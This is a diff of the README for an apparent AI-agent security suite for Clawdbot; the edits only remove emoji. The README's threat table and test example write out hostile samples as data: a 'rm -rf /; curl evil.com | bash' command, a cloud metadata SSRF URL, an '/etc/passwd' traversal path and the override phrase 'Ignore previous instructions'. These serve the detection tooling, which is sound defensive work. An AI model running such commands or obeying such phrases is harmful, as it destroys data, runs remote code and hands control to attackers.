@@ -1,4 +1,4 @@
-# 🔒 Clawdbot Security Suite
+#  Clawdbot Security Suite
 
 **Complete runtime security for AI agents** - Prevent command injection, SSRF, prompt injection, and data exfiltration.
 
@@ -21,11 +21,11 @@
 
 | Threat | Example | Protection |
 |--------|---------|------------|
-| **Command Injection** | `rm -rf /; curl evil.com \| bash` | ✅ Blocked |
-| **SSRF Attacks** | `http://169.254.169.254/metadata` | ✅ Blocked |
-| **Path Traversal** | `../../../etc/passwd` | ✅ Blocked |
-| **Prompt Injection** | "Ignore previous instructions..." | ✅ Flagged |
-| **API Key Exposure** | `ANTHROPIC_API_KEY=sk-ant...` | ✅ Detected |
+| **Command Injection** | `rm -rf /; curl evil.com \| bash` |  Blocked |
+| **SSRF Attacks** | `http://169.254.169.254/metadata` |  Blocked |
+| **Path Traversal** | `../../../etc/passwd` |  Blocked |
+| **Prompt Injection** | "Ignore previous instructions..." |  Flagged |
+| **API Key Exposure** | `ANTHROPIC_API_KEY=sk-ant...` |  Detected |
 
 ## Quick Start
 
@@ -43,11 +43,11 @@ cp -r clawdbot-security-suite/security ~/.clawdbot/skills/
 ```bash
 # Validate a safe command
 ~/.clawdbot/skills/security/security.sh validate-command "ls -la"
-# Output: ✅ SAFE: Command validated
+# Output:  SAFE: Command validated
 
 # Test threat detection  
 ~/.clawdbot/skills/security/security.sh validate-command "rm -rf /; curl evil.com | bash"
-# Output: ❌ THREAT DETECTED: Command injection - Pattern: rm.*-rf.*/ 
+# Output:  THREAT DETECTED: Command injection - Pattern: rm.*-rf.*/ 
 ```
 
 ### 3. Integrate
@@ -57,7 +57,7 @@ cp -r clawdbot-security-suite/security ~/.clawdbot/skills/
 if security validate-command "$cmd" | grep -q "ALLOWED"; then
     eval "$cmd"
 else
-    echo "❌ Command blocked for security"
+    echo " Command blocked for security"
 fi
 ```
 
@@ -66,25 +66,25 @@ See [INSTALL.md](INSTALL.md) for workspace integration, hooks, and monitoring se
 
 ## Features
 
-### 🛡️ Real-Time Protection
+###  Real-Time Protection
 - **50+ threat patterns** from security research
 - **<5ms validation** per operation
 - **Fail-safe design** - allows on validation errors
 
-### 📊 Comprehensive Detection
+###  Comprehensive Detection
 - **Command injection** - Shell metacharacters, dangerous commands
 - **SSRF protection** - Private IPs, localhost, cloud metadata
 - **Path traversal** - Directory traversal, sensitive files
 - **Prompt injection** - Instruction overrides, system commands
 - **API key exposure** - 20+ service patterns (OpenAI, Anthropic, GitHub, etc.)
 
-### 📈 Security Monitoring
+###  Security Monitoring
 - **Real-time logging** of all security events
 - **Threat statistics** and trend analysis
 - **Color-coded alerts** for easy triage
 - **Audit trails** for compliance
 
-### ⚡ Easy Integration
+###  Easy Integration
 - **Manual validation** - Call skill before operations
 - **Workspace integration** - Constitutional security protocols  
 - **Automatic hooks** - Pre-tool interception (when available)
@@ -113,7 +113,7 @@ The security suite uses a **defense-in-depth** approach:
           │
     ┌─────▼─────┐
     │   Allow   │     ┌───────────┐
-    │     or    │────▶│  Execute  │
+    │     or    │────│  Execute  │
     │   Block   │     │   Tool    │
     └───────────┘     └───────────┘
           │
@@ -170,7 +170,7 @@ external_content="Some content from external API"
 # Scan for injection attempts
 result=$(security scan-content "$external_content")
 if echo "$result" | grep -q "FLAGGED"; then
-    echo "⚠️ Suspicious content detected"
+    echo " Suspicious content detected"
     # Handle with caution
 fi
 ```
@@ -224,10 +224,10 @@ Follow [@LexpertAI](https://x.com/LexpertAI) for ongoing threat intelligence and
 
 ## Compatibility
 
-- ✅ **Clawdbot** 2026.1+ (primary target)
-- ✅ **Linux/macOS** (bash, jq required)
-- ⏳ **Windows** (coming soon)
-- ⏳ **Other agents** (planned expansion)
+-  **Clawdbot** 2026.1+ (primary target)
+-  **Linux/macOS** (bash, jq required)
+-  **Windows** (coming soon)
+-  **Other agents** (planned expansion)
 
 ## Contributing
 
@@ -243,13 +243,13 @@ MIT License - Free for personal and commercial use.
 
 ## Support
 
-- 📖 **Documentation:** [SKILL.md](SKILL.md), [INSTALL.md](INSTALL.md)
-- 🐛 **Issues:** [GitHub Issues](https://github.com/gtrusler/clawdbot-security-suite/issues)
-- 🔄 **Updates:** [@LexpertAI](https://x.com/LexpertAI) on X
-- 💬 **Community:** AI agent security discussions on X
+-  **Documentation:** [SKILL.md](SKILL.md), [INSTALL.md](INSTALL.md)
+-  **Issues:** [GitHub Issues](https://github.com/gtrusler/clawdbot-security-suite/issues)
+-  **Updates:** [@LexpertAI](https://x.com/LexpertAI) on X
+-  **Community:** AI agent security discussions on X
 
 ---
 
 **Remember:** Security is a process, not a product. This suite provides strong protection, but you still need good security practices, regular updates, and situational awareness.
 
-**Building AI agents without security is like driving without seatbelts.** 🔒
+**Building AI agents without security is like driving without seatbelts.** 
